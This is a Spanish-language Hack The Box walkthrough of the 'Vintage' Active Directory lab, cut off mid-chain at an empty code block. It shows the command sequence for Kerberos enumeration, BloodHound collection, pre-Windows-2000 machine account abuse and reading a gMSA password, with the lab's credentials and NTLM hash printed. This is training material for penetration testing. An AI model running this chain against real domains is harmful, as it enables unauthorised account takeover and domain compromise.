---
title: "HTB Vintage"
date: 2025-10-17 09:35:00 +0000
categories: [WriteUps, Hack The Box, Active Directory, Hard]
tags: [NTLMDisabled, AS-REPRoast, Kerberoasting, Pre2kComputers, ReadGMSAPassword, gMSA, GenericWrite, ACLs, GenericAll, EnablingDisabledUser, TargetedKerberoast, PasswordSpraying, DPAPI, BloodHound, AllowedToAct, RBCD, Resource-basedConstrainedDelegation, KerberosDelegation, DCSync]
image: /assets/img/writeups/htb-vintage/VintageLogo.png
---
`Vintage` es una máquina Windows con grandes dificultades diseñada en torno a un supuesto escenario de violación, en el que al atacante se le proporcionan credenciales de usuario con pocos privilegios. La máquina cuenta con un entorno Active Directory sin ADCS instalado, y la autenticación NTLM está deshabilitada. Hay una `Pre2k Computer created`, lo que significa que la contraseña es la misma que el sAMAccountName de la cuenta de la máquina. La "Domain Computer" unidad organizativa (OU) tiene una configuración que permite a los atacantes leer la contraseña de la cuenta de servicio, que tiene gMSA configurado. Tras obtener la contraseña, la cuenta de servicio puede añadirse a un grupo privilegiado. El grupo tiene control total sobre un usuario deshabilitado. El atacante debe restaurar el usuario deshabilitado y configurar un `Service Principal Name (SPN)` para realizar Kerberoasting. Después de recuperar la contraseña, la cuenta de usuario ha reutilizado la misma contraseña. El nuevo usuario comprometido tiene una contraseña almacenada en el Gestor de Credenciales. El usuario puede agregarse a otro grupo privilegiado configurado para la `Resource-based Constrained Delegation (RBCD)` en el Controlador de Dominio, lo que permite al atacante comprometerlo.

- Tags: [#NTLMDisabled](/tags/ntlmdisabled/) [#AS-REPRoast](/tags/as-reproast/) [#Kerberoasting](/tags/kerberoasting/) [#Pre2kComputers](/tags/pre2kcomputers/) [#ReadGMSAPassword](/tags/readgmsapassword/) [#gMSA](/tags/gmsa/) [#GenericWrite](/tags/genericwrite/) [#ACLs](/tags/acls/) [#GenericAll](/tags/genericall/) [#EnablingDisabledUser](/tags/enablingdisableduser/) [#TargetedKerberoast](/tags/targetedkerberoast/) [#PasswordSpraying](/tags/passwordspraying/) [#DPAPI](/tags/dpapi/) [#BloodHound](/tags/bloodhound/) [#AllowedToAct](/tags/allowedtoact/) [#RBCD](/tags/rbcd/) [#Resource-basedConstrainedDelegation](/tags/resource-basedconstraineddelegation/) [#KerberosDelegation](/tags/kerberosdelegation/) [#DCSync](/tags/dcsync/)

---
## Reconnaissance

Para la fase de reconocimiento inicial de la máquina **`Vintage`** utilizamos nuestra herramienta personalizada [**iRecon**](https://github.com/Gzzcoo/iRecon). Esta herramienta automatiza un escaneo Nmap completo que incluye:

1. **Detección de puertos TCP abiertos** (`-p- --open`).
2. **Escaneo de versiones** (`-sV`).
3. **Ejecución de scripts NSE típicos** para enumeración adicional (`-sC`).
4. **Exportación del resultado** en XML y conversión a HTML para facilitar su lectura.

Para empezar, exportaremos en una variable de entorno llamada `IP` la dirección IP de la máquina objetivo, lanzaremos la herramienta de `iRecon` proporcionándole la variable de entorno.

**Resumen de Puertos Abiertos**

En la enumeración de puertos encontramos importantes como los siguientes:

<table><thead><tr><th>Puerto</th><th>Servicio</th><th data-hidden>Versión</th></tr></thead><tbody><tr><td>88</td><td>Kerberos</td><td></td></tr><tr><td>445</td><td>SMB</td><td></td></tr><tr><td>389</td><td>LDAP</td><td></td></tr><tr><td>636</td><td>LDAPS</td><td></td></tr><tr><td>5985</td><td>WinRM</td><td></td></tr></tbody></table>

Por los puertos encontrados, parece que nos estamos enfrentando a un Domain Controller (DC) de Windows.

```bash
❯ export IP=10.10.11.45
❯ iRecon "$IP"
```

![image](/assets/img/writeups/htb-vintage/Vintage_2.png)

A través de la herramienta de `netexec` y `ldapsearch` enumeraremos el equipo para localizar más información. Entre la información obtenida, verificamos el `hostname`, versión del SO y el nombre del dominio.


> Tenemos la variable de entorno `IP` creada anteriormente que tiene como valor: **10.10.11.45**
{: .prompt-info }

```bash
❯ nxc ldap "$IP"
LDAP        10.10.11.45     389    DC01             [*] None (name:DC01) (domain:vintage.htb)

❯ ldapsearch -x -H ldap://"$IP" -s base | grep defaultNamingContext
defaultNamingContext: DC=vintage,DC=htb
```

En nuestro archivo `/etc/hosts` añadiremos las siguientes entradas correspondientes para que a la hora de hacer referencia al dominio, hostname o FQDN (nombre de dominio completo que identifica de forma única una máquina o servidor en una red).

```bash
❯ echo '10.10.11.45 dc01.vintage.htb dc01 vintage.htb' | sudo tee -a /etc/hosts
10.10.11.45 dc01.vintage.htb dc01 vintage.htb
```

***
### NTLM is disabled? Protected users? Testing Kerberos authentication

> En algunas máquinas de HTB, a veces se nos proporcionan credenciales iniciales como en este caso.
{: .prompt-info }

![image](/assets/img/writeups/htb-vintage/Vintage_3.png)

Al intentar validar las credenciales que se nos proporcionan por parte de HTB, observamos el mensaje de `STATUS_NOT_SUPPORTED`.  Esto parece indicar que la autenticación por NTLM, es decir usuario y contraseña, está protegida o deshabilitada.

En nuestro segundo intento de autenticarnos mediante Kerberos con el parámetro (**-k**) nos aparecía el siguiente mensaje de error: `KRB_AP_ERR_SKEW`.


> KRB\_AP\_ERR\_SKEW es un error de autenticación de Kerberos que indica que la diferencia de tiempo entre el cliente y el servidor (Centro de Distribución de Claves - KDC) es demasiado grande. La autenticación Kerberos falla con este error porque el protocolo requiere que los tiempos del cliente y del servidor estén sincronizados para evitar ataques de repetición.
{: .prompt-info }

> Tenemos la variable de entorno `IP` creada anteriormente que tiene como valor: **10.10.11.45**
{: .prompt-danger }

```bash
❯ nxc ldap "$IP" -u 'P.Rosa' -p 'Rosaisbest123'
LDAP        10.10.11.45     389    DC01             [*] None (name:DC01) (domain:vintage.htb)
LDAP        10.10.11.45     389    DC01             [-] vintage.htb\P.Rosa:Rosaisbest123 STATUS_NOT_SUPPORTED

❯ nxc ldap "$IP" -u 'P.Rosa' -p 'Rosaisbest123' -k
LDAP        10.10.11.45     389    DC01             [*] None (name:DC01) (domain:vintage.htb)
LDAP        10.10.11.45     389    DC01             [-] vintage.htb\P.Rosa:Rosaisbest123 KRB_AP_ERR_SKEW
```

Para solucionar el problema sincronizaremos la hora a través de `ntpdate`. Una vez sincronizada nuestra hora con el KDC, al volver a intentar autenticarnos mediante Kerberos (**-k**), verificamos que nos valida correctamente la autenticación.

En este momento, sacamos en conclusión los siguientes puntos importantes de cara a la continuación de la máquina:

1. Parece que la autenticación NTLM está protegida/deshabilitada. Quizás solamente algún usuario se encuentre en algún grupo como `Protected Users` o directamente tengamos que autenticarnos siempre por Kerberos y no por NTLM.
2. Para autenticarnos mediante Kerberos, deberemos de solicitar un TGT (Ticket Granting Ticket) de la cuenta que obtengamos.
3. Configurar correctamente nuestra máquina atacante para trabajar correctamente con Kerberos y no tener los típicos problemas de que no encuentra el server, errores como hemos visto de la hora, etc.
4. Seguramente tengamos que sincronizar nuestra hora con el KDC mediante `ntpdate`.

> Tenemos la variable de entorno `IP` creada anteriormente que tiene como valor: **10.10.11.45**
{: .prompt-info }

```bash
❯ sudo ntpdate -s "$IP"

❯ nxc ldap "$IP" -u 'P.Rosa' -p 'Rosaisbest123' -k
LDAP        10.10.11.45     389    DC01             [*] None (name:DC01) (domain:vintage.htb)
LDAP        10.10.11.45     389    DC01             [+] vintage.htb\P.Rosa:Rosaisbest123
```

Tendremos que configurar nuestro archivo `/etc/krb5.conf` con el siguiente contenido, para que así a la hora de autenticarnos mediante Kerberos, pueda encontrar el KDC (Key Distribution Center), que normalmente es el Domain Controller.

```bash
[libdefaults]
    default_realm = VINTAGE.HTB
    ticket_lifetime = 24h
    renew_lifetime = 7d
    forwardable = true
    rdns = false

[realms]
    VINTAGE.HTB = {
        kdc = dc01.vintage.htb
        admin_server = dc01.vintage.htb
        default_domain = vintage.htb
    }

[domain_realm]
    .vintage.htb = VINTAGE.HTB
    vintage.htb = VINTAGE.HTB
```

A través de la herramienta de `impacket-getTGT` solicitaremos un TGT (Ticket Granting Ticket) del usuario `P.Rosa@vintage.htb`. Este comando nos generará un ticket en format `.ccache` el cual deberemos de exportar en la variable `KRB5CCNAME` para poder hacer uso del TGT correctamente.

A través de la utilidad de `klist` verificaremos que nuestro TGT es válido y se encuentra funcionando correctamente.

> Tenemos la variable de entorno `IP` creada anteriormente que tiene como valor: **10.10.11.45**
{: .prompt-info }

```bash
❯ impacket-getTGT vintage.htb/P.Rosa:'Rosaisbest123' -dc-ip "$IP"
Impacket v0.13.0.dev0+20250404.133223.00ced47f - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in P.Rosa.ccache

❯ export KRB5CCNAME=$(pwd)/P.Rosa.ccache

❯ klist
Ticket cache: FILE:/home/gzzcoo/Desktop/HackTheBox/Labs/Windows/AD/Vintage/content/P.Rosa.ccache
Default principal: P.Rosa@VINTAGE.HTB

Valid starting       Expires              Service principal
04/24/2025 21:46:40  04/25/2025 07:46:40  krbtgt/VINTAGE.HTB@VINTAGE.HTB
	renew until 04/25/2025 21:46:11
```

***
### SMB Enumeration

Crearemos una variable de entorno llamada `FQDN`en la cual su valor sea el FQDN del Domain Controller de la máquina objetivo, que en este caso, es `dc01.vintage.htb`.

Para utilizar el Ticket Granting Ticket (TGT) que hemos solicitado en el punto anterior y almacenado en KRB5CCNAME, en `NetExec` tenemos el parámetro (`--use-kcache`) para utilizar nuestro TGT (`.ccache`).

Realizaremos una enumeración del servicio SMB en el cual nos encontramos que tenemos permisos de `READ` sobre los siguientes recursos compartidos: `IPC$`, `NETLOGON` y `SYSVOL`. De momento nada interesante que podamos obtener.

> Cuando trabajamos con Kerberos, es fundamental utilizar el **FQDN (Fully Qualified Domain Name)** en lugar de la dirección IP. Esto se debe a que Kerberos no se basa en IPs, sino en **nombres de servicio (SPN, Service Principal Names)**, los cuales están estrechamente ligados al nombre completo del host dentro del dominio.
> 
> Al usar el FQDN, el cliente puede construir correctamente el SPN necesario para solicitar un ticket de servicio (TGS) al KDC. Si en cambio usamos una IP, el cliente no puede asociarla con ningún SPN válido, lo que provoca errores de autenticación o directamente un fallback a otro mecanismo como NTLM.
> 
> Por eso, para que el proceso de autenticación Kerberos funcione correctamente, siempre es necesario referirse a los servicios utilizando su FQDN, como por ejemplo `dc01.vintage.htb`, y no simplemente `10.10.11.45`.
{: .prompt-info }

```bash
❯ export FQDN=dc01.vintage.htb

❯ nxc smb "$FQDN" --use-kcache --shares
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\P.Rosa from ccache 
SMB         dc01.vintage.htb 445    dc01             [*] Enumerated shares
SMB         dc01.vintage.htb 445    dc01             Share           Permissions     Remark
SMB         dc01.vintage.htb 445    dc01             -----           -----------     ------
SMB         dc01.vintage.htb 445    dc01             ADMIN$                          Remote Admin
SMB         dc01.vintage.htb 445    dc01             C$                              Default share
SMB         dc01.vintage.htb 445    dc01             IPC$            READ            Remote IPC
SMB         dc01.vintage.htb 445    dc01             NETLOGON        READ            Logon server share 
SMB         dc01.vintage.htb 445    dc01             SYSVOL          READ            Logon server share 
```

***
### Users Enumeration

Para enumerar los usuarios del dominio, usamos **NetExec** con el protocolo **LDAP (puerto 389)**. Aprovechamos el TGT que ya tenemos en caché en la variable `KRB5CCNAME` con el parámetro (`--use-kcache`), y le indicamos (`--users`) para que nos liste los usuarios disponibles. Además, muchas veces se muestran las **descripciones**, donde a veces aparece info útil como posibles credenciales o roles.

La salida nos confirma que se han enumerado correctamente los usuarios del dominio `vintage.htb`, incluyendo nombres como `Administrator`, `Guest`, `krbtgt` y `M.Rossi`. En algunos casos, también podemos ver la fecha del último cambio de contraseña y si hubo intentos fallidos de login.

> Tenemos la variable de entorno `FQDN` creada anteriormente que tiene como valor: **dc01.vintage.htb**
{: .prompt-danger }

```bash
❯ nxc ldap "$FQDN" --use-kcache --users
LDAP        dc01.vintage.htb 389    DC01             [*] None (name:DC01) (domain:vintage.htb)
LDAP        dc01.vintage.htb 389    DC01             [+] vintage.htb\P.Rosa from ccache 
LDAP        dc01.vintage.htb 389    DC01             [*] Enumerated 14 domain users: vintage.htb
LDAP        dc01.vintage.htb 389    DC01             -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
LDAP        dc01.vintage.htb 389    DC01             Administrator                 2024-06-08 13:34:54 0        Built-in account for administering the computer/domain      
LDAP        dc01.vintage.htb 389    DC01             Guest                         2024-11-13 15:16:53 1        Built-in account for guest access to the computer/domain    
LDAP        dc01.vintage.htb 389    DC01             krbtgt                        2024-06-05 12:27:35 0        Key Distribution Center Service Account                     
LDAP        dc01.vintage.htb 389    DC01             M.Rossi                       2024-06-05 15:31:08 1                                                                    
LDAP        dc01.vintage.htb 389    DC01             R.Verdi                       2024-06-05 15:31:08 1                                                                    
LDAP        dc01.vintage.htb 389    DC01             L.Bianchi                     2024-06-05 15:31:08 1                                                                    
LDAP        dc01.vintage.htb 389    DC01             G.Viola                       2024-06-05 15:31:08 1                                                                    
LDAP        dc01.vintage.htb 389    DC01             C.Neri                        2024-06-05 23:08:13 0                                                                    
LDAP        dc01.vintage.htb 389    DC01             P.Rosa                        2024-11-06 13:27:16 0                                                                    
LDAP        dc01.vintage.htb 389    DC01             svc_sql                       2025-04-24 21:32:21 1                                                                    
LDAP        dc01.vintage.htb 389    DC01             svc_ldap                      2024-06-06 15:45:27 1                                                                    
LDAP        dc01.vintage.htb 389    DC01             svc_ark                       2024-06-06 15:45:27 1                                                                    
LDAP        dc01.vintage.htb 389    DC01             C.Neri_adm                    2024-06-07 12:54:14 0                                                                    
LDAP        dc01.vintage.htb 389    DC01             L.Bianchi_adm                 2024-11-26 12:40:30 0 
```

Almacenaremos el resultado del output anterior en un archivo llamado `user.txt`, el siguiente punto será transformar este resultado para quedarnos solamente con los nombres de usuarios tal y como se muestra a continuación.

```bash
❯ cat users.txt
LDAP        dc01.vintage.htb 389    DC01             Administrator                 2024-06-08 13:34:54 0        Built-in account for administering the computer/domain      
LDAP        dc01.vintage.htb 389    DC01             Guest                         2024-11-13 15:16:53 1        Built-in account for guest access to the computer/domain    
LDAP        dc01.vintage.htb 389    DC01             krbtgt                        2024-06-05 12:27:35 0        Key Distribution Center Service Account                     
LDAP        dc01.vintage.htb 389    DC01             M.Rossi                       2024-06-05 15:31:08 1                                                                    
LDAP        dc01.vintage.htb 389    DC01             R.Verdi                       2024-06-05 15:31:08 1                                                                    
LDAP        dc01.vintage.htb 389    DC01             L.Bianchi                     2024-06-05 15:31:08 1                                                                    
LDAP        dc01.vintage.htb 389    DC01             G.Viola                       2024-06-05 15:31:08 1                                                                    
LDAP        dc01.vintage.htb 389    DC01             C.Neri                        2024-06-05 23:08:13 0                                                                    
LDAP        dc01.vintage.htb 389    DC01             P.Rosa                        2024-11-06 13:27:16 0                                                                    
LDAP        dc01.vintage.htb 389    DC01             svc_sql                       2025-04-24 21:32:21 1                                                                    
LDAP        dc01.vintage.htb 389    DC01             svc_ldap                      2024-06-06 15:45:27 1                                                                    
LDAP        dc01.vintage.htb 389    DC01             svc_ark                       2024-06-06 15:45:27 1                                                                    
LDAP        dc01.vintage.htb 389    DC01             C.Neri_adm                    2024-06-07 12:54:14 0                                                                    
LDAP        dc01.vintage.htb 389    DC01             L.Bianchi_adm                 2024-11-26 12:40:30 0 

❯ cat users.txt | awk '{print $5}' | sponge users.txt

❯ cat users.txt
Administrator
Guest
krbtgt
M.Rossi
R.Verdi
L.Bianchi
G.Viola
C.Neri
P.Rosa
svc_sql
svc_ldap
svc_ark
C.Neri_adm
L.Bianchi_adm
```

***
### Attempting to perform AS-REP Roast and Kerberoasting Attack (FAILED)

Dado que disponemos de un listado potencial de usuarios válidos del dominio, intentamos realizar un **AS-REP Roast Attack**.

Este ataque consiste en solicitar un TGT (Ticket Granting Ticket) a aquellos usuarios del listado (`users.txt`) que tengan habilitado el flag `DONT_REQ_PREAUTH` de Kerberos. Para esto, utilizamos la herramienta `GetNPUsers.py` de la suite Impacket, que nos permite identificar qué usuarios tienen esa opción activa.

El objetivo es obtener un TGT sin autenticación previa y luego intentar crackear offline la contraseña. Sin embargo, ninguno de los usuarios tenía configurado dicho flag, por lo tanto, **no eran susceptibles a AS-REP Roasting**.

![image](/assets/img/writeups/htb-vintage/Vintage_4.png)

> Tenemos la variable de entorno `IP` creada anteriormente que tiene como valor: **10.10.11.45**
{: .prompt-danger }

```bash
❯ impacket-GetNPUsers -no-pass -usersfile users.txt -dc-ip "$IP" vintage.htb/
Impacket v0.13.0.dev0+20250404.133223.00ced47f - Copyright Fortra, LLC and its affiliated companies 

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User M.Rossi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User R.Verdi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User L.Bianchi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User G.Viola doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User C.Neri doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User P.Rosa doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User svc_ldap doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc_ark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User C.Neri_adm doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User L.Bianchi_adm doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Por otro lado, dado que ya contamos con credenciales válidas del dominio, intentamos realizar un ataque de **Kerberoasting**.

Este ataque se basa en solicitar un TGS (Ticket Granting Service) para aquellas cuentas del dominio que tengan asignado un **SPN (servicePrincipalName)**. Para ello, usamos la herramienta `GetUserSPNs.py` de Impacket, que nos permite identificar usuarios con SPNs asociados y solicitar el TGS correspondiente para luego intentar crackear el hash offline.

En este caso, el ataque tampoco tuvo éxito, ya que no se encontró ningún SPN en el dominio. La herramienta no devolvió ninguna entrada, lo que indica que actualmente **ninguna cuenta del dominio tiene un SPN asignado**.

![image](/assets/img/writeups/htb-vintage/Vintage_5.png)

> Tenemos la variable de entorno `IP` creada anteriormente que tiene como valor: **10.10.11.45**
{: .prompt-danger }

```bash
❯ impacket-GetUserSPNs vintage.htb/P.Rosa -k -no-pass -dc-ip "$IP" -dc-host dc01 -request
Impacket v0.13.0.dev0+20250404.133223.00ced47f - Copyright Fortra, LLC and its affiliated companies 

No entries found!
```

***
## BloodHound Enumeration

Después de revisar distintos servicios buscando un vector para escalar privilegios, decidimos hacer una enumeración con **BloodHound**, una herramienta clave en entornos Active Directory.

Para ello, usamos el recolector `bloodhound-python`, que nos permite extraer toda la información necesaria del dominio directamente desde nuestra máquina Linux, sin necesidad de acceso interactivo al dominio.

Como se muestra en la salida, la herramienta detectó correctamente el TGT en caché, se conectó al servidor LDAP y recopiló los principales objetos del dominio: usuarios, grupos, equipos, GPOs, OUs, etc. La recolección finalizó exitosamente generando un archivo `.zip` que luego podemos analizar con la interfaz de BloodHound.

> Tenemos la variable de entorno `FQDN` creada anteriormente que tiene como valor: **dc01.vintage.htb** y la variable de entorno `IP` que tiene como valor la dirección IP de **Vintage** - 10.10.11.4.
{: .prompt-danger }

```bash
❯ bloodhound-python -u 'P.rosa' -k -no-pass -d 'vintage.htb' -ns "$IP" -dc "$FQDN" --zip -c All --auth-method kerberos
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: vintage.htb
INFO: Using TGT from cache
INFO: Found TGT with correct principal in ccache file.
INFO: Connecting to LDAP server: dc01.vintage.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc01.vintage.htb
INFO: Found 16 users
INFO: Found 58 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: FS01.vintage.htb
INFO: Querying computer: dc01.vintage.htb
WARNING: Could not resolve: FS01.vintage.htb: The resolution lifetime expired after 3.103 seconds: Server Do53:10.10.11.45@53 answered The DNS operation timed out.
INFO: Done in 00M 10S
INFO: Compressing output into 20250424222743_bloodhound.zip
```

Levantaremos nuestro BloodHound-CE que tenemos instalado previamente a través del siguiente comando,

> En caso de no tener BloodHound-CE instalado en el equipo, podemos instalarlo desde la siguiente [guía](https://gzzcoo.gitbook.io/pentest-notes/active-directory-pentesting/bloodhound#installation-2).
{: .prompt-info }

```bash
❯ sudo docker-compose -f /opt/BloodHound-CE/docker-compose.yml start
Starting app-db     ... done
Starting graph-db   ... done
Starting bloodhound ... done
```

Una vez iniciemos BloodHound-CE y hayamos subido nuestro archivo comprimido .zip, exploraremos la interfaz para enumerar el dominio a través de BloodHound.

Por una parte, nos encontramos que disponemos de 2 Domain Admins del dominio, el usuario `Administrator` y `L.Bianchi_adm`.

![image](/assets/img/writeups/htb-vintage/Vintage_6.png)

Por otro lado, al utilizar la opción **Shortest path to Domain Admin** dentro de BloodHound, identificamos una ruta potencialmente interesante. Este camino nos muestra una cadena de relaciones que podríamos aprovechar si en algún momento logramos obtener acceso al usuario `C.Neri_adm`.

En este caso, lo que destaca es la presencia del permiso **AllowedToAct**, lo que sugiere que esta cuenta podría tener capacidad de **control remoto sobre otro equipo** del dominio. Esto, combinado con otros privilegios del grafo, podría abrirnos una vía clara hacia altos privilegios como **Domain Admin**.

> En fases posteriores, si conseguimos credenciales de `C.Neri_adm` o de otro nodo clave en la ruta, podríamos intentar un ataque de Resource-Based Constrained Delegation (RBCD), aprovechando este ACL.
{: .prompt-info }

![image](/assets/img/writeups/htb-vintage/Vintage_7.png)

Durante la enumeración, encontramos un total de **tres equipos** dentro del dominio:

* `DC01.vintage.htb`: el Domain Controller principal.
* `FS01.vintage.htb`: un equipo adicional del dominio.
* `GMSA01$@vintage.htb`: una cuenta de equipo que parece estar asociada a una **gMSA** (Group Managed Service Account), lo cual sugiere que podría estar vinculada a tareas automatizadas o servicios gestionados en el dominio.

Este último puede ser relevante si más adelante buscamos obtener la contraseña de la gMSA o identificar sobre qué equipo tiene permisos para actuar.

![image](/assets/img/writeups/htb-vintage/Vintage_8.png)

Buscando otros caminos para escalar privilegios o acceder a nuevas credenciales, encontramos un path interesante en BloodHound.

Si conseguimos credenciales del equipo `FS01$`, podríamos abusar del permiso **ReadGMSAPassword** sobre `GMSA01$`, lo que nos permitiría recuperar su contraseña. A su vez, esta cuenta tiene permisos de **AddSelf** y **GenericWrite**, lo cual nos abre otras posibles vías de ataque si podemos usar esos privilegios.

Además, si en algún punto logramos pertenecer al grupo `SERVICEMANAGERS`, tendríamos permisos de **GenericAll** sobre tres usuarios (`SVC_ARK`, `SVC_LDAP` y `SVC_SQL`), los cuales podrían ser útiles más adelante para escalar o moverse lateralmente dentro del dominio.

![image](/assets/img/writeups/htb-vintage/Vintage_9.png)

***
## Auth as FS01$

### Abusing Pre-Windows 2000 computers (Pre2k)

Investigando cómo podríamos autenticar como el equipo `FS01$`, notamos que pertenece al grupo **PRE-WINDOWS 2000 COMPATIBLE ACCESS**, lo cual puede abrir una vía interesante de acceso.

Este grupo está relacionado con equipos configurados como "anteriores a Windows 2000", donde la contraseña por defecto de la cuenta de máquina puede ser **predecible**. En muchos casos, esta contraseña se genera a partir del nombre del equipo en minúsculas (sin el símbolo `$`), por ejemplo: `fs01`.

Esto nos permite intentar autenticarnos con la cuenta `FS01$` usando como contraseña el nombre del equipo (`fs01`), lo cual puede funcionar si la cuenta fue creada manualmente o no ha sido modificada.

> Una vez logremos autenticarnos como `FS01$`, podríamos explotar los permisos de ReadGMSAPassword que vimos anteriormente.
{: .prompt-info }

[https://www.optiv.com/insights/source-zero/blog/diving-deeper-pre-created-computer-accounts](https://www.optiv.com/insights/source-zero/blog/diving-deeper-pre-created-computer-accounts)

[https://www.thehacker.recipes/ad/movement/builtins/pre-windows-2000-computers](https://www.thehacker.recipes/ad/movement/builtins/pre-windows-2000-computers)

![image](/assets/img/writeups/htb-vintage/Vintage_10.png)

Para comprobar si la cuenta del equipo `FS01$` sigue usando credenciales por defecto (es decir, el nombre del host en minúsculas sin el `$`), utilizamos la herramienta **pre2k**, como explicamos anteriormente.

Esta herramienta permite comprobar si los equipos que forman parte del grupo **PRE-WINDOWS 2000 COMPATIBLE ACCESS** conservan sus credenciales predeterminadas, lo cual es común si no fueron modificadas desde su creación.

En nuestro caso, generamos un archivo `computers.txt` con el nombre del equipo y lo pasamos como entrada a la herramienta. Como resultado, confirmamos que **las credenciales por defecto funcionan** para `FS01$.`

Esto nos permite autenticarnos como `FS01$`, lo cual será clave para leer la contraseña del gMSA y avanzar en la ruta indicada anteriormente.

> Tenemos la variable de entorno `IP` creada anteriormente que tiene como valor: **10.10.11.45**
{: .prompt-danger }

```bash
❯ echo 'fs01$' > computers.txt
❯ pre2k unauth -d vintage.htb -dc-ip "$IP" -inputfile computers.txt

                                ___    __         
                              /'___`\ /\ \        
 _____   _ __    __          /\_\ /\ \\ \ \/'\    
/\ '__`\/\`'__\/'__`\ _______\/_/// /__\ \ , <    
\ \ \L\ \ \ \//\  __//\______\  // /_\ \\ \ \\`\  
 \ \ ,__/\ \_\\ \____\/______/ /\______/ \ \_\ \_\
  \ \ \/  \/_/ \/____/         \/_____/   \/_/\/_/
   \ \_\                                      v3.1    
    \/_/                                          
                                            @unsigned_sh0rt
                                            @Tw1sm          

[23:14:25] INFO     Testing started at 2025-04-24 23:14:25                                                                                                                                                                           
[23:14:25] INFO     Using 10 threads                                                                                                                                                                                                 
[23:14:25] INFO     VALID CREDENTIALS: vintage.htb\fs01$:fs01
```

A través de la herramienta `getTGT.py` de **Impacket**, podemos solicitar el **TGT (Ticket Granting Ticket)** para la cuenta de equipo `FS01$`, lo que nos permitirá autenticarnos a servicios del dominio como si fuéramos dicho equipo.

Una vez obtenido el ticket (`.ccache`), lo guardamos localmente y configuramos la variable de entorno `KRB5CCNAME` para usarlo en futuras peticiones. Finalmente, verificamos su validez con la herramienta `klist`.

> Tenemos la variable de entorno `IP` creada anteriormente que tiene como valor: **10.10.11.45**
{: .prompt-danger }

```bash
❯ impacket-getTGT vintage.htb/'fs01$':fs01 -dc-ip "$IP"
Impacket v0.13.0.dev0+20250404.133223.00ced47f - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in fs01$.ccache

❯ export KRB5CCNAME=$(pwd)/'fs01$.ccache'

❯ klist
Ticket cache: FILE:/home/gzzcoo/Desktop/HackTheBox/Labs/Windows/AD/Vintage/content/fs01$.ccache
Default principal: fs01$@VINTAGE.HTB

Valid starting       Expires              Service principal
04/24/2025 23:17:51  04/25/2025 09:17:51  krbtgt/VINTAGE.HTB@VINTAGE.HTB
	renew until 04/25/2025 23:15:14
```

***
## Auth as GMSA01$

### Abusing ReadGMSAPassword privileges to retrieve gMSA password

Siguiendo el path que habíamos identificado, ahora que tenemos acceso como `FS01$`, podemos avanzar con el abuso del privilegio **ReadGMSAPassword**.

Este equipo forma parte del grupo `DOMAIN COMPUTERS`, cuyos miembros tienen permiso para leer la contraseña del objeto `GMSA01$`. Gracias a este ACL, tenemos la posibilidad de extraer directamente la contraseña de la gMSA asociada.

Este paso es clave para avanzar en la cadena de explotación, ya que nos permitirá actuar como `GMSA01$` y aprovechar sus privilegios dentro del dominio.

![image](/assets/img/writeups/htb-vintage/Vintage_11.png)

Para leer la contraseña de la cuenta `gMSA01$`, utilizamos la herramienta **BloodyAD**, esencial para pentesting en entornos Active Directory. Esta herramienta permite tanto enumerar como atacar objetos del dominio.

En este caso, nos autenticamos mediante Kerberos (`-k`) y solicitamos el atributo `msDS-ManagedPassword` del objeto `GMSA01$`, que es donde se almacena su contraseña.

> Como estamos usando autenticación Kerberos, es importante tener el TGT (`.ccache`) cargado en la variable `KRB5CCNAME` y asegurarnos de utilizar el **FQDN** en lugar de la dirección IP.\
En nuestro caso, ya habíamos definido la variable `FQDN` con el valor `dc01.vintage.htb`.
{: .prompt-danger }

```bash
❯ bloodyAD --host "$FQDN" -d "vintage.htb" -k get object 'GMSA01$' --attr msDS-ManagedPassword


distinguishedName: CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:b3a15bbdfb1c53238d4b50ea2c4d1178
msDS-ManagedPassword.B64ENCODED: cAPhluwn4ijHTUTo7liDUp19VWhIi9/YDwdTpCWVnKNzxHWm2Hl39sN8YUq3hoDfBcLp6S6QcJOnXZ426tWrk0ztluGpZlr3eWU9i6Uwgkaxkvb1ebvy6afUR+mRvtftwY1Vnr5IBKQyLT6ne3BEfEXR5P5iBy2z8brRd3lBHsDrKHNsM+Yd/OOlHS/e1gMiDkEKqZ4dyEakGx5TYviQxGH52ltp1KqT+Ls862fRRlEzwN03oCzkLYg24jvJW/2eK0aXceMgol7J4sFBY0/zAPwEJUg1PZsaqV43xWUrVl79xfcSbyeYKL0e8bKhdxNzdxPlsBcLbFmrdRdlKvE3WQ==
```

Una vez obtenido el hash **NTLM** de la cuenta `GMSA01$`, solicitaremos su **TGT (Ticket Granting Ticket)** utilizando la herramienta `getTGT.py` de **Impacket**.

El ticket generado se guarda en un archivo `.ccache`, que luego exportamos en la variable `KRB5CCNAME` para usarlo en futuras autenticaciones. Finalmente, con `klist` validamos que el TGT esté correctamente cargado.

> Tenemos la variable de entorno `IP` creada anteriormente que tiene como valor: **10.10.11.45**
{: .prompt-danger }

```bash
